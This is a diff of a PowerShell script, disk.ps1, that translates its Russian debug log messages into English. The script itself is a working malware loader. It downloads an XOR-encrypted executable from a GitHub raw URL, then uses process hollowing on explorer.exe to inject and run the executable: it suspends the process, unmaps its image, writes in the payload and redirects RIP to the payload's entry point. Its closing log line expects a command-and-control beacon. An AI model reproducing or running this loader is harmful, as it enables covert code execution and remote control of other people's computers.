@@ -1,41 +1,41 @@
-# disk.ps1 — DEBUG VERSION (пишем в debug_log.txt в папке first.ps1)
+# disk.ps1 — FULL ENGLISH DEBUG VERSION
 $logPath = "$PSScriptRoot\debug_log.txt"
-if (!(Test-Path $logPath)) { $logPath = "$env:TEMP\debug_disk.txt" }  # запасной вариант
+if (!(Test-Path $logPath)) { $logPath = "$env:TEMP\debug_disk.txt" }
+
 function Log($msg) {
     $t = Get-Date -Format "HH:mm:ss.fff"
-    "$t  | disk → $msg" | Out-File -FilePath $logPath -Append -Encoding UTF8
+    "$t | disk → $msg" | Out-File -FilePath $logPath -Append -Encoding UTF8
 }
 
-Log "disk.ps1 СТАРТОВАЛ"
+Log "disk.ps1 STARTED"
 
 Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2600)
-Log "Jitter прошёл"
+Log "Jitter done"
 
 $exeUrl = 'https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn_enc.exe'
-Log "Скачиваем зашифрованный EXE: $exeUrl"
+Log "Downloading encrypted payload from: $exeUrl"
 
 try {
     $wc = New-Object Net.WebClient
     $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130'
     $enc = $wc.DownloadData($exeUrl)
-    Log "EXE скачан — $($enc.Length) байт"
+    Log "Payload downloaded — $($enc.Length) bytes"
 } catch {
-    Log "ОШИБКА СКАЧИВАНИЯ EXE: $_"
+    Log "ERROR downloading payload: $_"
     return
 }
 
-Log "Расшифровываем XOR 0xAA..."
+Log "Decrypting XOR 0xAA..."
 $exe = [byte[]]$enc.Length
 for($i=0;$i -lt $enc.Length;$i++) { $exe[$i] = $enc[$i] -bxor 0xAA }
 $header = [BitConverter]::ToString($exe[0..3]) -replace '-',' '
-Log "Первые байты после расшифровки: $header (должно быть 4D 5A ...)"
+Log "Decrypted header: $header (should start with 4D 5A = MZ)"
 
-Log "Ищем explorer.exe..."
+Log "Finding explorer.exe..."
 $proc = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
-if (!$proc) { Log "КРИТИЧЕСКАЯ ОШИБКА: explorer.exe не найден!"; return }
-Log "Найден explorer PID: $($proc.Id)"
+if (!$proc) { Log "FATAL: explorer.exe not found!"; return }
+Log "Target explorer PID: $($proc.Id)"
 
-# Add-Type и hollowing с логами — сокращу, чтобы влезло
 Add-Type -MemberDefinition @'
 using System; using System.Runtime.InteropServices;
 public class H {
@@ -52,28 +52,31 @@ public class H {
 '@
 
 $hProc = [H]::OpenProcess(0x1F0FFF,$false,$proc.Id)
-Log "OpenProcess = $hProc"
-[H]::NtSuspendProcess($hProc); Log "explorer приостановлен"
+Log "OpenProcess handle: $hProc"
+[H]::NtSuspendProcess($hProc); Log "explorer suspended"
 $th = [H]::OpenThread(0x1F03FF,$false,$proc.Threads[0].Id)
 $ctx = [byte[]]1160
-[H]::GetThreadContext($th,$ctx); Log "Контекст получен"
+[H]::GetThreadContext($th,$ctx); Log "Context read"
 
 $base = [BitConverter]::ToInt64($ctx,0x10)
-Log "База explorer: 0x$('{0:X}' -f $base)"
-[H]::NtUnmapViewOfSection($hProc,[IntPtr]$base); Log "Старая база выгружена"
+Log "Original base: 0x$('{0:X}' -f $base)"
+[H]::NtUnmapViewOfSection($hProc,[IntPtr]$base); Log "Old image unmapped"
 
 $newBase = [H]::VirtualAllocEx($hProc,[IntPtr]$base,$exe.Length,0x3000,0x40)
-Log "Выделили память: 0x$('{0:X}' -f $newBase)"
+Log "New memory allocated at: 0x$('{0:X}' -f $newBase)"
 
-$w=0; [H]::WriteProcessMemory($hProc,$newBase,$exe,$exe.Length,[ref]$w) | Out-Null
-Log "Записано $w байт"
+$w=0
+[H]::WriteProcessMemory($hProc,$newBase,$exe,$exe.Length,[ref]$w) | Out-Null
+Log "Written $w bytes"
 
-$entryRva = [BitConverter]::ToUInt32($exe, [BitConverter]::ToUInt32($exe,0x3C)+0x28)
+$peOffset = [BitConverter]::ToUInt32($exe,0x3C)
+$entryRva = [BitConverter]::ToUInt32($exe,$peOffset+0x28)
 $entry = [Int64]$newBase + $entryRva
 $entryBytes = [BitConverter]::GetBytes($entry)
 [Array]::Copy($entryBytes,0,$ctx,0xB8,8)
-[H]::SetThreadContext($th,$ctx); Log "RIP установлен на entry point"
+[H]::SetThreadContext($th,$ctx)
+Log "RIP set to entry point 0x$('{0:X}' -f $entry)"
 
 [H]::NtResumeProcess($hProc)
-Log "EXPLORER ВОЗОБНОВЛЁН — PAYLOAD ЗАГРУЖЕН УСПЕШНО!"
-Log "Если C2 живой — он сейчас должен позвонить домой"
+Log "EXPLORER RESUMED — PAYLOAD INJECTED SUCCESSFULLY!"
+Log "If your C2 is alive — it should beacon now"
